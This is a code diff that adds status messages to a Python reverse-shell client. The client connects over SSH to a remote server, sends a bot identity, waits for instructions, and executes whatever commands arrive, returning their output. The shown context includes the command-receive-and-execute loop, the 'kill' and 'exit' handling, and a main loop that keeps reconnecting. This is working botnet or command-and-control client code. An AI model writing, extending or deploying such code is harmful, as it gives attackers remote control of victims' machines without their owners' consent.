@@ -26,18 +26,22 @@ process = None
 def exit_gracefully():
     global ssh_client, ssh_session, process
     
+    print("\n\n[!] Exiting gracefully...")
 
     
     if ssh_session and ssh_session.active:
         ssh_session.close()
+        print("[!] SSH session closed.")
     
     if ssh_client:
         ssh_client.close()
+        print("[!] SSH client disconnected.")
     
     
     if process and process.poll() is None:
         process.terminate()
         process.wait()
+        print("[!] Subprocess terminated.")
 
     
     sys.exit(0)
@@ -134,6 +138,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
         
         if ssh_session.active:
+            print("[!] Sending identity!")
             ssh_session.send(bot_user.encode())
 
             
@@ -142,6 +147,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             timeout_thread.daemon = True
             timeout_thread.start()
 
+            print("[!] Listening for instructions ...")
             while not timeout:
                 try:
                     ssh_session.settimeout(1.0)
@@ -149,16 +155,20 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
                     server_instructions = server_instructions.encode()
 
                     if server_instructions:
+                        
 
                         
                         if server_instructions == 'kill':
+                            print("[!] Session terminated by the server!")
                             exit_gracefully()
                         if server_instructions == 'exit':
+                            print("[*] Session finished by the server. Continuing to next loop.")
                             ssh_session.close()
                             ssh_client.close()
                             return
 
                         
+                        print("Trying to execute the command")
                         try:
                             output = io.StringIO()
                             sys.stdout = output  
@@ -170,6 +180,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
                         ssh_session.send(response.encode())
                         
+                        print("[!] Response sent!")
 
                         
                         ssh_session.close()
@@ -184,12 +195,14 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             ssh_client.close()
             response = f"Timeout while listening new instructions!"
             ssh_session.send(response.encode())
+            print("[!] Response sent!")
 
             return response
                 
         time.sleep(100)
 
     except Exception as e:
+        
         if ssh_session:
             ssh_session.close()
         if ssh_client:
@@ -208,6 +221,7 @@ if __name__ == "__main__":
             ssh_rev_shell(host, 'ubuntu', auth_path, user, 64000)
         except Exception as e:
             pass
+            
 
         
         time.sleep(0.5)
